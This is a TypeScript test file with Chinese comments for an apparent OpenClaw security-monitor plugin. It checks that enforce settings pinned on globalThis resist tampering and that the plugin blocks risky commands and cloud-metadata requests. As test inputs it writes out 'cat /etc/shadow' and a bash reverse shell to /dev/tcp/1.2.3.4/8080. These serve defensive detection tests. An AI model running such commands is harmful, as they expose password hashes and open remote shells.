/**
 * 行为级验证：插件 initialize 时把
 * runtime hook 相关配置传播进进程环境，供 preload hook 与其 fork 出的
 * 子进程消费。
 *
 *  - 自定义 application.runtimeHooks.logPath 必须导出为
 *    OPENCLAW_MONITOR_LOG_PATH，否则 hook 写入默认路径、collector tail
 *    自定义路径，两边静默断链。
 *  - application.runtimeHooks.networkEnabled=false 时网络 enforce env
 *    不得设置，且
 *    OPENCLAW_NETWORK_HOOK_ENABLED 供 hook-mounter / network.js 关停
 *    网络拦截；进程 enforce 不受影响。
 *
 * enforce 开关防进程内篡改。Node 的 process.env 只接受
 * {writable:true, configurable:true, enumerable:true} 描述符，无法直接
 * 冻结 env 槽位；插件改为把权威值钉在 globalThis（configurable:false
 * 的只读 getter），hook 侧先查钉住值、再回落 env 惰性读取。本文件覆盖
 * 「锁定后篡改无效」行为级用例。
 */

import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import { mkdtempSync, copyFileSync } from 'fs';
import { tmpdir } from 'os';
import { join, resolve } from 'path';
import { SecurityMonitorStore } from './store.js';

const SOURCE_POLICY_PATH = resolve('policies/security-policy.spl.yaml');
const ENV_KEYS = [
  'OPENCLAW_MONITOR_LOG_PATH',
  'OPENCLAW_RUNTIME_ENFORCE',
  'OPENCLAW_RUNTIME_BLOCKED_FLAGS',
  'OPENCLAW_RUNTIME_BLOCK_PATTERNS',
  'OPENCLAW_NETWORK_ENFORCE',
  'OPENCLAW_NETWORK_HOOK_ENABLED',
] as const;

describe('runtime hook 环境传播', () => {
  let tmpDir: string;
  let ndjsonPath: string;
  let policyPath: string;
  let store: SecurityMonitorStore;
  const saved: Record<string, string | undefined> = {};

  beforeEach(() => {
    for (const k of ENV_KEYS) {
      saved[k] = process.env[k];
      delete process.env[k];
    }
    tmpDir = mkdtempSync(join(tmpdir(), 'store-hook-env-'));
    ndjsonPath = join(tmpDir, 'security-events.jsonl');
    policyPath = join(tmpDir, 'security-policy.spl.yaml');
    copyFileSync(SOURCE_POLICY_PATH, policyPath);
  });

  afterEach(async () => {
    if (store) await store.shutdown();
    for (const k of ENV_KEYS) {
      if (saved[k] === undefined) delete process.env[k];
      else process.env[k] = saved[k];
    }
  });

  function baseConfig(overrides: Record<string, unknown> = {}) {
    return {
      collector: { ndjsonPath },
      application: {
        enabled: true,
        runtimeHooks: { enabled: true, logPath: join(tmpDir, 'security-events-runtime.jsonl') },
      },
      system: { enabled: false },
      network: { enabled: false },
      assetMonitor: { enabled: false },
      ...overrides,
    };
  }

  it('自定义 logPath 导出为 OPENCLAW_MONITOR_LOG_PATH', async () => {
    const customLog = join(tmpDir, 'custom-sink', 'events.jsonl');
    store = new SecurityMonitorStore();
    await store.initialize(
      baseConfig({
        application: { enabled: true, runtimeHooks: { enabled: true, logPath: customLog } },
      })
    );
    expect(process.env.OPENCLAW_MONITOR_LOG_PATH).toBe(customLog);
  });

  it('networkEnabled=false：网络 enforce 关闭、hook 开关置 false，进程 enforce 保留', async () => {
    store = new SecurityMonitorStore();
    await store.initialize(
      baseConfig({
        application: {
          enabled: true,
          runtimeHooks: {
            enabled: true,
            logPath: join(tmpDir, 'security-events-runtime.jsonl'),
            networkEnabled: false,
          },
        },
        intervention: { enabled: true, mode: 'enforce', policyPath, reloadIntervalMs: 0 },
      })
    );
    expect(process.env.OPENCLAW_RUNTIME_ENFORCE).toBe('true');
    expect(process.env.OPENCLAW_NETWORK_ENFORCE).toBeUndefined();
    expect(process.env.OPENCLAW_NETWORK_HOOK_ENABLED).toBe('false');
  });

  it('networkEnabled 缺省视为开：网络 enforce 与 hook 开关都置位', async () => {
    store = new SecurityMonitorStore();
    await store.initialize(
      baseConfig({
        intervention: { enabled: true, mode: 'enforce', policyPath, reloadIntervalMs: 0 },
      })
    );
    expect(process.env.OPENCLAW_NETWORK_ENFORCE).toBe('true');
    expect(process.env.OPENCLAW_NETWORK_HOOK_ENABLED).toBe('true');
  });

  it('非 enforce 模式：enforce env 清除，hook 开关仍按配置传播', async () => {
    store = new SecurityMonitorStore();
    await store.initialize(
      baseConfig({
        application: {
          enabled: true,
          runtimeHooks: {
            enabled: true,
            logPath: join(tmpDir, 'security-events-runtime.jsonl'),
            networkEnabled: false,
          },
        },
        intervention: { enabled: true, mode: 'audit', policyPath, reloadIntervalMs: 0 },
      })
    );
    expect(process.env.OPENCLAW_RUNTIME_ENFORCE).toBeUndefined();
    expect(process.env.OPENCLAW_NETWORK_ENFORCE).toBeUndefined();
    expect(process.env.OPENCLAW_NETWORK_HOOK_ENABLED).toBe('false');
  });

  // enforce 开关防进程内篡改。真实 hook 模块与本文件同进程加载，
  // 直接驱动其导出的判定函数验证「钉住值权威、env 篡改无效」。
  describe('enforce env pin 防进程内篡改', () => {
    const PIN_KEY = '__OPENCLAW_SECURITY_HOOK_ENV__';
    // eslint-disable-next-line @typescript-eslint/no-var-requires
    const runtimeHook = require(resolve(process.cwd(), 'hooks/runtime.js')) as {
      shouldBlock: (event: { risk_flags?: string[] }) => string | undefined;
    };
    // eslint-disable-next-line @typescript-eslint/no-var-requires
    const networkHook = require(resolve(process.cwd(), 'hooks/network.js')) as {
      checkRequestBlocked: (reqInfo: { options: unknown; method: string; headers: Record<string, unknown> }) => string | undefined;
    };

    async function initEnforceStore(overrides: Record<string, unknown> = {}) {
      store = new SecurityMonitorStore();
      await store.initialize(
        baseConfig({
          intervention: { enabled: true, mode: 'enforce', policyPath, reloadIntervalMs: 0 },
          ...overrides,
        })
      );
    }

    it('语义兼容：hook 先加载、initialize 后 pin 在本进程生效', async () => {
      delete process.env.OPENCLAW_RUNTIME_ENFORCE;
      expect(runtimeHook.shouldBlock({ risk_flags: ['reverse_shell'] })).toBeUndefined();
      await initEnforceStore();
      expect(runtimeHook.shouldBlock({ risk_flags: ['reverse_shell'] })).toContain('risk flag: reverse_shell');
    });

    it('锁定后进程内篡改无效：runtime enforce 与 blocked flags 以 pin 为准', async () => {
      await initEnforceStore();
      const pin = (globalThis as Record<string, unknown>)[PIN_KEY] as () => Record<string, string | undefined>;
      expect(typeof pin).toBe('function');
      expect(pin().OPENCLAW_RUNTIME_ENFORCE).toBe('true');

      // 篡改尝试：赋值 / 删除 env 均无法改变判定。
      process.env.OPENCLAW_RUNTIME_ENFORCE = 'false';
      expect(runtimeHook.shouldBlock({ risk_flags: ['reverse_shell'] })).toContain('risk flag: reverse_shell');
      delete process.env.OPENCLAW_RUNTIME_ENFORCE;
      expect(runtimeHook.shouldBlock({ risk_flags: ['reverse_shell'] })).toContain('risk flag: reverse_shell');
      expect(pin().OPENCLAW_RUNTIME_ENFORCE).toBe('true');

      // blocked flags 同样以 pin 为准。
      process.env.OPENCLAW_RUNTIME_BLOCKED_FLAGS = 'mass_deletion';
      expect(runtimeHook.shouldBlock({ risk_flags: ['reverse_shell'] })).toContain('risk flag: reverse_shell');
      expect(runtimeHook.shouldBlock({ risk_flags: ['skill_binary_execution'] })).toContain(
        'risk flag: skill_binary_execution'
      );
    });

    it('锁定后进程内篡改无效：network enforce 与 hook 开关以 pin 为准', async () => {
      await initEnforceStore();
      // 用默认阻断名单内的云元数据地址（malicious-c2-*.com 示例域名已从默认名单移除）。
      const blockedReq = { options: 'http://169.254.169.254/notify', method: 'GET', headers: {} };

      process.env.OPENCLAW_NETWORK_ENFORCE = 'false';
      expect(networkHook.checkRequestBlocked(blockedReq)).toContain('blocked host: 169.254.169.254');
      delete process.env.OPENCLAW_NETWORK_ENFORCE;
      expect(networkHook.checkRequestBlocked(blockedReq)).toContain('blocked host: 169.254.169.254');

      // 开关篡改：pin 记录 networkEnabled=true，env 置 false 不得关闭拦截。
      process.env.OPENCLAW_NETWORK_HOOK_ENABLED = 'false';
      expect(networkHook.checkRequestBlocked(blockedReq)).toContain('blocked host: 169.254.169.254');
    });

    it('pin 描述符不可重定义 / 删除 / 赋值', async () => {
      await initEnforceStore();
      const desc = Object.getOwnPropertyDescriptor(globalThis, PIN_KEY);
      expect(desc).toBeDefined();
      expect(desc!.configurable).toBe(false);
      expect(desc!.writable).toBe(false);

      expect(() => {
        (globalThis as Record<string, unknown>)[PIN_KEY] = () => ({});
      }).toThrow();
      expect(() => {
        delete (globalThis as Record<string, unknown>)[PIN_KEY];
      }).toThrow();

      // 原始 getter 仍然完好且返回 enforce 值。
      const pin = (globalThis as Record<string, unknown>)[PIN_KEY] as () => Record<string, string | undefined>;
      expect(pin().OPENCLAW_RUNTIME_ENFORCE).toBe('true');
    });

    it('重新 initialize 以新配置更新 pin（审计模式解除 enforce）', async () => {
      await initEnforceStore();
      expect(runtimeHook.shouldBlock({ risk_flags: ['reverse_shell'] })).toContain('risk flag: reverse_shell');

      await store.shutdown();
      store = new SecurityMonitorStore();
      await store.initialize(
        baseConfig({
          intervention: { enabled: true, mode: 'audit', policyPath, reloadIntervalMs: 0 },
        })
      );
      expect(runtimeHook.shouldBlock({ risk_flags: ['reverse_shell'] })).toBeUndefined();
      const pin = (globalThis as Record<string, unknown>)[PIN_KEY] as () => Record<string, string | undefined>;
      expect(pin().OPENCLAW_RUNTIME_ENFORCE).toBeUndefined();
    });
  });

  // ⭐ #469-A：runtime hook 的**模式级 Tier-1 阻断**（读 /etc/shadow、
  // 读 ~/.aws/credentials …）的开关与传播。
  //
  // 这是一档**新增的阻断能力** ⇒ 必须有操作员一键关闭的口子（FP 治理红线：
  // 「block 必须高准确率」⇒ 误报时只能改包升级是不可接受的）。
  //
  // 语义锁定三件事：
  //   1. 默认**开启**（配置缺省 = 开启）；
  //   2. 关闭时 env 与 pin **同值**（'0'）⇒ 网关进程与子进程判定一致；
  //   3. 开启时**不钉该键、不删 env** ⇒ 操作员在网关环境里手工设的
  //      OPENCLAW_RUNTIME_BLOCK_PATTERNS=0（应急逃生阀）继续有效。
  describe('#469-A 模式级 Tier-1 阻断开关', () => {
    const PIN_KEY = '__OPENCLAW_SECURITY_HOOK_ENV__';
    // eslint-disable-next-line @typescript-eslint/no-var-requires
    const runtimeHook = require(resolve(process.cwd(), 'hooks/runtime.js')) as {
      shouldBlock: (event: { risk_flags?: string[]; command_line?: string }, options?: { command_line?: string }) => string | undefined;
    };

    async function initWithRuntimeHooks(runtimeHooksExtra: Record<string, unknown>) {
      store = new SecurityMonitorStore();
      await store.initialize(
        baseConfig({
          application: {
            enabled: true,
            runtimeHooks: {
              enabled: true,
              logPath: join(tmpDir, 'security-events-runtime.jsonl'),
              ...runtimeHooksExtra,
            },
          },
          intervention: { enabled: true, mode: 'enforce', policyPath, reloadIntervalMs: 0 },
        })
      );
    }

    const SHADOW_CMD = 'cat /etc/shadow';

    it('默认开启：模式级阻断生效，env 未被写值', async () => {
      await initWithRuntimeHooks({});
      expect(process.env.OPENCLAW_RUNTIME_BLOCK_PATTERNS).toBeUndefined();
      expect(
        runtimeHook.shouldBlock({ risk_flags: [] }, { command_line: SHADOW_CMD })
      ).toContain('Tier-1');
    });

    it('显式 blockPatternsEnabled=false：模式级关闭，flag 级不受影响', async () => {
      await initWithRuntimeHooks({ blockPatternsEnabled: false });
      expect(process.env.OPENCLAW_RUNTIME_BLOCK_PATTERNS).toBe('0');
      const pin = (globalThis as Record<string, unknown>)[PIN_KEY] as () => Record<string, string | undefined>;
      expect(pin().OPENCLAW_RUNTIME_BLOCK_PATTERNS).toBe('0');

      expect(
        runtimeHook.shouldBlock({ risk_flags: [] }, { command_line: SHADOW_CMD })
      ).toBeUndefined();
      expect(
        runtimeHook.shouldBlock({ risk_flags: ['reverse_shell'] }, { command_line: 'bash -i >& /dev/tcp/1.2.3.4/8080 0>&1' })
      ).toContain('risk flag: reverse_shell');
    });

    it('开启时不覆盖操作员手工设的应急逃生阀（env 保留、pin 不钉该键）', async () => {
      process.env.OPENCLAW_RUNTIME_BLOCK_PATTERNS = '0';
      await initWithRuntimeHooks({});
      expect(process.env.OPENCLAW_RUNTIME_BLOCK_PATTERNS).toBe('0');
      const pin = (globalThis as Record<string, unknown>)[PIN_KEY] as () => Record<string, string | undefined>;
      expect(Object.prototype.hasOwnProperty.call(pin(), 'OPENCLAW_RUNTIME_BLOCK_PATTERNS')).toBe(false);
      expect(
        runtimeHook.shouldBlock({ risk_flags: [] }, { command_line: SHADOW_CMD })
      ).toBeUndefined();
    });
  });
});
